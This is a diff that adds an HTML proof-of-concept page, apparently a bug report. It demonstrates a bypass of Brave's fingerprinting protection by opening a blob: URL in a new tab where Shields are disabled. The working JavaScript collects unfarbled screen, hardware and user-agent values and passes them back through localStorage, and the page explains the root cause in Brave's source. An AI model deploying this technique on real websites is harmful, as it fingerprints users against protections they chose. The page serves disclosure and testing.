@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Blob URL Farbling Bypass</title>
+    <style>
+        :root { color-scheme: light dark; }
+        body {
+            font-family: system-ui, -apple-system, sans-serif;
+            line-height: 1.45;
+            margin: 0;
+            padding: 18px;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        table { border-collapse: collapse; margin-top: 1em; width: 100%; }
+        th, td {
+            border: 1px solid rgba(127,127,127,0.28);
+            padding: 6px 12px;
+            text-align: left;
+            font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
+            font-size: 0.9em;
+        }
+        th { background: rgba(127,127,127,0.08); }
+        .match { color: green; }
+        .mismatch { color: red; font-weight: bold; }
+        #status { margin-top: 1em; opacity: 0.85; }
+        #verdict { font-size: 1.1em; margin-top: 1em; }
+        button {
+            font-size: 1em;
+            padding: 8px 18px;
+            cursor: pointer;
+            border-radius: 6px;
+            border: 1px solid rgba(127,127,127,0.28);
+            background: rgba(127,127,127,0.06);
+        }
+        button:hover { background: rgba(127,127,127,0.12); }
+        details { margin-top: 1.5em; opacity: 0.85; }
+        details summary { cursor: pointer; font-weight: bold; }
+        details pre {
+            background: rgba(127,127,127,0.06);
+            padding: 12px;
+            border-radius: 6px;
+            overflow-x: auto;
+            font-size: 0.85em;
+        }
+    </style>
+    <script>
+        // Blob page HTML: reads real values, writes to localStorage, closes itself.
+        let blobPageHtml = `<!DOCTYPE html>
+<html><head><meta charset="UTF-8"><title>Probe</title>
+<script>
+    localStorage.setItem('blob_screen_width', window.screen.width);
+    localStorage.setItem('blob_screen_height', window.screen.height);
+    localStorage.setItem('blob_screen_availWidth', window.screen.availWidth);
+    localStorage.setItem('blob_screen_availHeight', window.screen.availHeight);
+    localStorage.setItem('blob_outerWidth', window.outerWidth);
+    localStorage.setItem('blob_outerHeight', window.outerHeight);
+    localStorage.setItem('blob_screenX', window.screenX);
+    localStorage.setItem('blob_screenY', window.screenY);
+    localStorage.setItem('blob_hardwareConcurrency', navigator.hardwareConcurrency);
+    localStorage.setItem('blob_deviceMemory', navigator.deviceMemory || 'N/A');
+    localStorage.setItem('blob_languages', JSON.stringify(navigator.languages));
+    localStorage.setItem('blob_userAgent', navigator.userAgent);
+    localStorage.setItem('blob_origin', location.origin);
+    localStorage.setItem('blob_done', 'true');
+    window.close();
+<\/script>
+</head><body></body></html>`;
+
+        function clearBlobStorage() {
+            let keys = [];
+            for (let i = 0; i < localStorage.length; i++) {
+                let k = localStorage.key(i);
+                if (k.startsWith('blob_')) keys.push(k);
+            }
+            keys.forEach(k => localStorage.removeItem(k));
+        }
+
+        function readMainPageValues() {
+            return {
+                'screen.width': window.screen.width,
+                'screen.height': window.screen.height,
+                'screen.availWidth': window.screen.availWidth,
+                'screen.availHeight': window.screen.availHeight,
+                'outerWidth': window.outerWidth,
+                'outerHeight': window.outerHeight,
+                'screenX': window.screenX,
+                'screenY': window.screenY,
+                'hardwareConcurrency': navigator.hardwareConcurrency,
+                'deviceMemory': navigator.deviceMemory || 'N/A',
+                'languages': JSON.stringify(navigator.languages),
+                'userAgent': navigator.userAgent,
+                'origin': location.origin,
+            };
+        }
+
+        function readBlobPageValues() {
+            return {
+                'screen.width': localStorage.getItem('blob_screen_width'),
+                'screen.height': localStorage.getItem('blob_screen_height'),
+                'screen.availWidth': localStorage.getItem('blob_screen_availWidth'),
+                'screen.availHeight': localStorage.getItem('blob_screen_availHeight'),
+                'outerWidth': localStorage.getItem('blob_outerWidth'),
+                'outerHeight': localStorage.getItem('blob_outerHeight'),
+                'screenX': localStorage.getItem('blob_screenX'),
+                'screenY': localStorage.getItem('blob_screenY'),
+                'hardwareConcurrency': localStorage.getItem('blob_hardwareConcurrency'),
+                'deviceMemory': localStorage.getItem('blob_deviceMemory'),
+                'languages': localStorage.getItem('blob_languages'),
+                'userAgent': localStorage.getItem('blob_userAgent'),
+                'origin': localStorage.getItem('blob_origin'),
+            };
+        }
+
+        function renderTable(mainVals, blobVals) {
+            let tbody = document.getElementById('results');
+            tbody.innerHTML = '';
+            let hasMismatch = false;
+            for (let key in mainVals) {
+                let mv = String(mainVals[key]);
+                let bv = String(blobVals[key]);
+                let match = (mv === bv);
+                if (!match) hasMismatch = true;
+                let tr = document.createElement('tr');
+                tr.innerHTML =
+                    '<td>' + key + '</td>' +
+                    '<td>' + mv + '</td>' +
+                    '<td>' + bv + '</td>' +
+                    '<td class="' + (match ? 'match' : 'mismatch') + '">' +
+                    (match ? 'Same' : 'DIFFERENT') + '</td>';
+                tbody.appendChild(tr);
+            }
+            document.getElementById('verdict').textContent = hasMismatch
+                ? 'Farbling bypass confirmed: blob page returned different (unfarbled) values.'
+                : 'No bypass detected: values match.';
+            document.getElementById('verdict').className = hasMismatch ? 'mismatch' : 'match';
+        }
+
+        function runTest() {
+            clearBlobStorage();
+            let mainVals = readMainPageValues();
+
+            let blob = new Blob([blobPageHtml], { type: 'text/html' });
+            let blobUrl = URL.createObjectURL(blob);
+
+            document.getElementById('status').textContent = 'Opening blob tab...';
+
+            // Open the blob page. It will write to localStorage and close itself.
+            let w = window.open(blobUrl, '_blank');
+
+            // Poll localStorage until the blob page signals it's done.
+            let attempts = 0;
+            let poller = setInterval(() => {
+                attempts++;
+                if (localStorage.getItem('blob_done') === 'true') {
+                    clearInterval(poller);
+                    let blobVals = readBlobPageValues();
+                    renderTable(mainVals, blobVals);
+                    document.getElementById('status').textContent =
+                        'Done. Blob tab opened, read values, wrote to localStorage, and closed itself.';
+                    URL.revokeObjectURL(blobUrl);
+                } else if (attempts > 100) {
+                    clearInterval(poller);
+                    document.getElementById('status').textContent =
+                        'Timed out waiting for blob page. Popup may have been blocked.';
+                }
+            }, 100);
+        }
+    </script>
+</head>
+<body>
+    <h2>Blob URL Farbling Bypass</h2>
+    <p>
+        Brave's fingerprinting protections (farbling) are controlled by Shields.
+        When a blob: URL is opened in a new tab, <code>GetBraveShieldsEnabled()</code>
+        checks <code>url.SchemeIsHTTPOrHTTPS()</code> on the raw blob URL. Since
+        <code>blob:</code> is not HTTP/HTTPS, Shields returns disabled and farbling
+        is set to OFF, even though the blob page inherits its creator's origin.
+    </p>
+    <p>
+        Click the button below. This will:
+    </p>
+    <ol>
+        <li>Read fingerprint-relevant values on this page (farbled by Brave Shields).</li>
+        <li>Open a <code>blob:</code> URL in a new tab via <code>window.open()</code>.</li>
+        <li>The blob page reads the same values (unfarbled), writes them to <code>localStorage</code>, and closes itself.</li>
+        <li>This page reads the blob's values from <code>localStorage</code> and compares.</li>
+    </ol>
+    <button onclick="runTest()">Run Test</button>
+    <p id="status"></p>
+    <table>
+        <thead>
+            <tr><th>Property</th><th>Main Page (farbled)</th><th>Blob Page (unfarbled)</th><th>Match?</th></tr>
+        </thead>
+        <tbody id="results"></tbody>
+    </table>
+    <p id="verdict"></p>
+
+    <details>
+        <summary>How it works</summary>
+        <pre>// 1. Create a blob URL pointing to an HTML page with inline JS
+let blob = new Blob([html], { type: 'text/html' });
+let blobUrl = URL.createObjectURL(blob);
+
+// 2. Open it in a new tab (user gesture required)
+window.open(blobUrl, '_blank');
+
+// 3. Blob page JS runs, reads unfarbled values, exfiltrates via localStorage
+localStorage.setItem('real_screen_width', window.screen.width);
+window.close();
+
+// 4. Main page reads the real values back
+let realWidth = localStorage.getItem('real_screen_width');</pre>
+        <p>
+            The blob page is same-origin with the creator
+            (<code>location.origin</code> matches), so <code>localStorage</code>
+            is shared. The blob page could also use <code>BroadcastChannel</code>,
+            <code>fetch()</code>, or <code>postMessage</code> to exfiltrate.
+        </p>
+    </details>
+
+    <details>
+        <summary>Root cause</summary>
+        <pre>// brave_shields_utils.cc:273
+bool GetBraveShieldsEnabled(HostContentSettingsMap* map, const GURL& url) {
+  // ...
+  if (url.is_valid() && !url.SchemeIsHTTPOrHTTPS()) {
+    return false;  // blob: hits this branch
+  }
+  // ...
+}
+
+// brave_shields_web_contents_observer.cc:315-320
+// When blob URL opens in a new tab, no parent frame exists,
+// so navigation_handle->GetURL() (the raw blob: URL) is used
+// as primary_url for the shields lookup.</pre>
+    </details>
+</body>
+</html>
